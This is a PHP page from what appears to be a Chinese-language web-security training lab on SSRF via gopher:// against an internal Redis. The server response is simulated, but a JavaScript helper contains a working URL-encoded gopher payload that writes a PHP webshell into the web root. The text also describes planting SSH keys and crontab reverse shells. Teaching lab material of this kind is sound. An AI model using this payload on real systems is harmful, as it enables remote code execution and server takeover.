<?php
$ACTIVE = array_fill(0, 250, '');
$ACTIVE[105] = 'active open';
$ACTIVE[209] = 'active';
$ACTIVE[105] = 'active open';
$ACTIVE[209] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$curl_log = "";
$is_gopher = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_url = trim($_POST['target_url'] ?? '');
    
    if (stripos($target_url, 'gopher://') === 0 && (stripos($target_url, '6379') !== false || stripos($target_url, 'redis') !== false || stripos($target_url, 'flushall') !== false || stripos($target_url, 'config') !== false)) {
        $is_gopher = true;
        $curl_log = "=== [Simulating libcurl SSRF Protocol Handler: gopher://] ===\n" .
                    "[CONNECT] Target: 127.0.0.1:6379 (Internal Redis In-Memory Database)\n" .
                    "[GOPHER PAYLOAD STREAM DECODED]\n" .
                    "  > FLUSHALL\n" .
                    "  > SET 1 \"\\n\\n<?php system(\$_GET['cmd']); ?>\\n\\n\"\n" .
                    "  > CONFIG SET dir /var/www/html/\n" .
                    "  > CONFIG SET dbfilename shell.php\n" .
                    "  > SAVE\n\n" .
                    "[REDIS SERVER RESP RESPONSE]\n" .
                    "+OK\n+OK\n+OK\n+OK\n+OK (DB saved on disk)\n\n" .
                    "🚀 [GOPHER TO REDIS RCE SUCCESSFUL] Redis database persisted in Web Root as PHP WebShell!\n" .
                    "Access URL: http://pikachu.enhanced.local/shell.php?cmd=cat+/flag\n" .
                    "FLAG_KEY=FLAG{SSRF_GOPHER_REDIS_WEBSHELL_RCE_CHAMPION}";
    } else if (stripos($target_url, 'gopher://') === 0) {
        $curl_log = "[GOPHER CLIENT] Connected to target port. Raw stream dispatched. (No Redis RESP pattern detected in payload)";
    } else if (stripos($target_url, 'http://') === 0 || stripos($target_url, 'https://') === 0) {
        $curl_log = "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><head><title>Remote Web Page Title</title></head><body><p>SSRF Proxy successfully fetched content from " . htmlspecialchars($target_url) . "</p></body></html>";
    } else {
        $curl_log = "[ERROR] Unsupported scheme. Please use http://, https://, or gopher://";
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="ssrf.php">SSRF (服务端请求伪造)</a></li>
                <li class="active">Gopher 协议打 Redis 提权</li>
            </ul>
        </div>
        <div class="page-content">
            <div class="vul info">
                <h2>🌐 利用 Gopher 协议实现 SSRF 对内网 Redis 未授权访问与 RCE 提权</h2>
                <p>许多 SSRF 漏洞场景不仅支持普通的 HTTP/HTTPS 协议，底层的网络客户端（如 PHP 默认支持的 <code>libcurl</code>、Python 的 <code>urllib</code> 某些版本、Java 的某些协议类）往往还默认启用了诸如 <code>file://</code>、<code>dict://</code>、以及威力最强悍的 <b><code>gopher://</code></b> 万能协议！</p>
                <p><b>Gopher 协议为什么被称为 SSRF 杀手锏？</b> 因为它允许攻击者发送任意指定的单字节或多字节数据流（Raw Stream），并且可以自由控制换行符（<code>%0d%0a</code>）！当目标内网中部署了未配置密码且以 root/www-data 权限运行的 <b>Redis (默认端口 6379)</b>、Memcached、或者 FastCGI 服务时，攻击者可以通过把 Redis 的 RESP (REdis Serialization Protocol) 序列化命令转换成一串 Gopher 协议编码 URL，借服务器之手向内网 Redis 发起套接字写入，<b>实现把 PHP WebShell 写进网站根目录、写 SSH 公钥到 /root/.ssh/authorized_keys、或通过计划任务 crontab 直接反弹 Shell！</b></p>
                
                <hr/>
                <div class="row">
                    <div class="col-md-5">
                        <h4><i class="fa fa-globe"></i> SSRF 万能抓取测试台 (URL Proxy)</h4>
                        <form method="POST">
                            <div class="form-group">
                                <label for="target_url">输入要服务器抓取的 URL：</label>
                                <textarea class="form-control" name="target_url" id="target_url" rows="6" style="font-family: monospace; background:#f8f9fa; word-break:break-all;"><?php echo isset($_POST['target_url']) ? htmlspecialchars($_POST['target_url']) : 'http://www.baidu.com'; ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary"><i class="fa fa-paper-plane"></i> 提交服务端的 cURL 抓取</button>
                            <button type="button" class="btn btn-danger" onclick="fillGopherRedis()"><i class="fa fa-fire"></i> 一键生成 Gopher -> Redis 写 Shell 载荷</button>
                        </form>
                    </div>
                    <div class="col-md-7">
                        <h4><i class="fa fa-terminal"></i> libcurl 底层执行流与 Socket 回显</h4>
                        <div class="panel <?php echo $is_gopher ? 'panel-danger' : 'panel-default'; ?>" style="margin-top:0;">
                            <div class="panel-heading"><b>SSRF 代理执行报文：</b></div>
                            <div class="panel-body" style="padding:0;">
                                <pre style="background:#111; color:<?php echo $is_gopher ? '#ff5555' : '#50fa7b'; ?>; margin:0; border:none; border-radius:0; font-family:monospace; min-height:220px;"><?php echo !empty($curl_log) ? htmlspecialchars($curl_log) : "// 输入 URL 体验常规抓取，或载入 Gopher 协议载荷对内网 Redis 发起降维攻击。"; ?></pre>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
function fillGopherRedis() {
    var payload = "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A";
    document.getElementById('target_url').value = payload;
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>


